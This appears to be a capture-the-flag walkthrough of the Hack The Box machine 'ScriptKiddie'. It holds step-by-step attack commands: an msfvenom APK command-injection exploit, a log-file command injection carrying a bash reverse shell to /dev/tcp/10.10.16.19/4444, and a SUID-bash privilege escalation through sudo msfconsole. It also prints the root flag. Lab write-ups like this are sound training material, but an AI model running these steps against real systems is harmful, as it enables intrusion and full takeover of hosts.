@@ -1,0 +1,103 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.10.226
+result:
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,5000 10.10.10.226
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
+|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
+|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d'5 h4ck3r t00l5
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.226:5000/
+
+input searchsploit 
+Metasploit Framework.
+
+take attention:
+Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py
+
+let's build payload
+command: msfconsole
+command: search msfvenom
+command: use 0
+command: set lhost 10.10.16.19
+command: set lport 7979
+command: set payload cmd/unix/reverse_netcat
+
+let's upload msf.apk to payloads
+os choose android
+lhost 127.0.0.1
+upload msf.apk
+
+upgrade shell.
+cat app.py
+take attentio this code:
+def searchsploit(text, srcip):
+    if regex_alphanum.match(text):
+        result = subprocess.check_output(['searchsploit', '--color', text])
+        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
+    else:
+        with open('/home/kid/logs/hackers', 'a') as f:
+            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+        return render_template('index.html', sserror="stop hacking me - well hack you back")
+
+let's go to logs:
+cd /home/kid/logs
+
+command: cd /home/kid/logs
+command: cat scanlosers.sh
+result:
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+command: echo "x x x 127.0.0.1; ping -c 1 10.10.16.19 #"  > hackers
+result:
+01:45:17.338399 IP 10.10.10.226 > 10.10.16.19: ICMP echo request, id 5, seq 1, length 64
+01:45:17.338453 IP 10.10.16.19 > 10.10.10.226: ICMP echo reply, id 5, seq 1, length 64
+
+let's put shell payload to log
+command: nc -lvnp 4444
+command: echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1' # ." > hackers
+
+upgrade shell
+command: sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+
+command: sudo /opt/metasploit-framework-6.0.9/msfconsole
+>> irb
+>> system("cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf")
+result:
+true
+
+command: /tmp/0xdf -p
+command: cat /root/root.text
+40220867d58a88c82a913ea16dd78d7f
+
+resource:
+https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#box-info
